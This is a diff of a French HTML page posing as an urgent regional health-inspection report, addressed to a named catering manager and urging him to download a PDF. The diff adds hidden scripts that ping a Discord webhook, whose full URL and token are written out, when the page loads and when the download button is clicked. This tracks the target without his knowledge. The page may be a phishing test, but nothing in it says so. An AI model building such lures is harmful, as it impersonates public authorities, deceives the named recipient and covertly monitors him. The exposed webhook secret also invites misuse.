@@ -3,60 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Rapport Sanitaire - Fournisseurs Alimentaires</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Inspection Sanitaire - Rapport Urgent</title>
     <style>
+        /* Global Styles */
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f4f4f4;
             margin: 0;
             padding: 0;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f7f7f7;
+            color: #333;
         }
+
+        /* Container */
         .container {
-            max-width: 800px;
+            max-width: 1000px;
             margin: 50px auto;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
             padding: 20px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
         }
-        h1 {
-            color: #2c3e50;
-            font-size: 24px;
+
+        /* Header */
+        .header {
             text-align: center;
+            padding: 10px 0;
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+        .header h1 {
+            color: #2c3e50;
+            font-size: 28px;
+            margin: 0;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+
+        /* Content */
+        .content {
+            padding: 30px;
+            line-height: 1.8;
+        }
+
+        .content h2 {
+            color: #2980b9;
+            font-size: 22px;
             margin-bottom: 20px;
         }
-        p {
-            font-size: 16px;
-            color: #34495e;
-            line-height: 1.6;
+
+        .content p {
+            font-size: 18px;
+            color: #555;
         }
+
+        .content strong {
+            color: #c0392b;
+        }
+
+        /* Button */
         .button-container {
             text-align: center;
             margin-top: 30px;
         }
+
         .button {
-            background-color: #2980b9;
+            background-color: #27ae60;
             color: white;
-            padding: 15px 30px;
+            padding: 15px 25px;
+            font-size: 18px;
+            font-weight: bold;
             text-decoration: none;
-            font-size: 16px;
-            border-radius: 5px;
+            border-radius: 8px;
             transition: background-color 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
         }
+
         .button:hover {
-            background-color: #3498db;
+            background-color: #2ecc71;
         }
+
+        /* Footer */
         footer {
             margin-top: 40px;
             text-align: center;
-            font-size: 12px;
+            padding: 20px;
+            font-size: 14px;
             color: #7f8c8d;
+            background-color: #f0f0f0;
+            border-top: 2px solid #e0e0e0;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px;
+                padding: 15px;
+            }
+
+            .content {
+                padding: 20px;
+            }
+
+            .button {
+                padding: 12px 20px;
+                font-size: 16px;
+            }
         }
     </style>
     <script>
-        // Envoyer un message au webhook dès que la page est chargée
-        fetch('https://discord-webhook-url.com', {
+        // Envoie le message au webhook lorsque la page est chargée
+        fetch('https://discord.com/api/webhooks/1296398668462686269/sZTeI9lGOeZhjSGS1dv2T6GZ0KiwpD6cF9SavBQHrwnnBsSskJ6xiHJTi3pG2TelKM18', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -69,9 +130,9 @@
             }),
         });
 
-        // Fonction pour envoyer un deuxième message au webhook lorsque le PDF est téléchargé
+        // Fonction pour envoyer l'événement de téléchargement du PDF
         function sendDownloadEvent() {
-            fetch('https://discord-webhook-url.com', {
+            fetch('https://discord.com/api/webhooks/1296398668462686269/sZTeI9lGOeZhjSGS1dv2T6GZ0KiwpD6cF9SavBQHrwnnBsSskJ6xiHJTi3pG2TelKM18', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -88,18 +149,33 @@
 </head>
 <body>
     <div class="container">
-        <h1>Rapport Sanitaire Urgent</h1>
-        <p>Nous avons détecté une alerte sanitaire concernant certains produits alimentaires distribués par des fournisseurs dans la région. Il est essentiel que vous consultiez la liste des lots concernés pour éviter tout risque au sein de votre service de restauration.</p>
-        <p>Le rapport ci-dessous contient des informations détaillées sur les lots impactés ainsi que des recommandations pour traiter cette situation.</p>
-
-        <div class="button-container">
-            <!-- Lien de téléchargement du PDF avec déclenchement de l'événement "Téléchargement" -->
-            <a class="button" href="https://leondenis2404.github.io/leondeniscv.github.io/leondenis.pdf" download="rapport_sanitaire_complet.pdf" onclick="sendDownloadEvent()">Télécharger le rapport (PDF)</a>
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fb/Emblem-important-red.svg/1024px-Emblem-important-red.svg.png" alt="Alerte">
+            <h1>Inspection Sanitaire - Rapport Critique</h1>
         </div>
-    </div>
+        <div class="content">
+            <h2>Important: Mesures correctives concernant les fournisseurs alimentaires</h2>
+            <p>
+                Cher Monsieur <strong>Guillo</strong>, <br><br>
+                Suite à nos récentes investigations sanitaires sur les produits alimentaires distribués par divers fournisseurs dans la région, nous avons détecté plusieurs <strong>anomalies critiques</strong>. Il est impératif que les responsables de la restauration collective prennent connaissance du <strong>rapport détaillé</strong> afin de mettre en place des mesures correctives immédiates.<br><br>
+                Ce rapport contient : 
+            </p>
+            <ul>
+                <li>Les produits concernés et leur distribution par fournisseur.</li>
+                <li>Les actions à entreprendre immédiatement.</li>
+                <li>Les recommandations d’experts sanitaires.</li>
+            </ul>
+            <p>
+                En tant que Responsable du service restauration, votre coopération est essentielle pour garantir la sécurité des repas fournis aux établissements. Nous vous demandons de télécharger et d'examiner le rapport complet ci-dessous.
+            </p>
 
-    <footer>
-        © 2024 - Inspection Sanitaire Régionale Bretagne
-    </footer>
+            <div class="button-container">
+                <a class="button" href="https://leondenis2404.github.io/leondeniscv.github.io/leondenis.pdf" download="rapport_sanitaire_complet.pdf" onclick="sendDownloadEvent()">Télécharger le rapport (PDF)</a>
+            </div>
+        </div>
+        <footer>
+            © 2024 Inspection Sanitaire - Région Bretagne. Tous droits réservés.
+        </footer>
+    </div>
 </body>
 </html>
